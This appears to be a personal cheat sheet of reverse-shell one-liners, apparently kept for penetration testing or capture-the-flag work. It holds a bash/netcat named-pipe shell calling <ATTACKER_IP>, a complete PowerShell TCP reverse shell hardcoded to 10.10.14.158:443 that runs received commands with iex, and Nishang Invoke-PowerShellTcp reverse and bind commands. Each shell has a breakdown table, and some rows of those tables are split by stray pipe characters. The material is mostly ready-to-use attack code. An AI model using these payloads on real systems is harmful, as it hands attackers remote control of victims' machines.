# Payloads OneLiners
```table-of-contents
```
## Netcat/Bash Reverse Shell (Explained)
### The One-Liner
```SHELL
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
```
### Breakdown
| **Command**               | **Description**                                                                                                  |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `rm -f /tmp/f`            | Removes any existing file named `f` in `/tmp` to avoid conflicts.                                                |
| `mkfifo /tmp/f`           | Creates a **Named Pipe** (FIFO) at `/tmp/f`. This is the core mechanism.                                         |
| `cat /tmp/f               | `                                                                                                                |
| `/bin/bash -i 2>&1        | `                                                                                                                |
| `nc <IP> <PORT> > /tmp/f` | Connects to the attacker. The output of the connection is sent _back_ into the pipe (`/tmp/f`), creating a loop. |
## PowerShell Reverse Shell (Explained)
### The One-Liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
### Breakdown
| **Component**                                 | **Description**                                                                           |
| ----------------------------------------- | ------------------------------------------------------------------------------------- |
| `powershell -nop -c`                      | Starts PowerShell with **NoProfile** (faster, safer) and executes the Command string. |
| `New-Object System.Net.Sockets.TCPClient` | Creates a raw TCP socket connection to the attacker.                                  |
| `$stream = $client.GetStream()`           | Gets the network stream to read/write data.                                           |
| `[byte[]]$bytes = 0..65535                | %{0}`                                                                                 |
| `while(($i = $stream.Read(...) -ne 0)`    | A loop that keeps running as long as data is coming in.                               |
| `iex $data`                               | **Invoke-Expression**: Executes the received string as a command.                     |
| `2>&1                                     | Out-String`                                                                           |
| `$stream.Write(...)`                      | Sends the command output back to the attacker.                                        |
### Invoke-PowerShellTcp (Nishang)
```powershell
# Reverse Connect (Victim -> Attacker)
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>

# Bind Connect (Attacker -> Victim)
Invoke-PowerShellTcp -Bind -Port <PORT>
```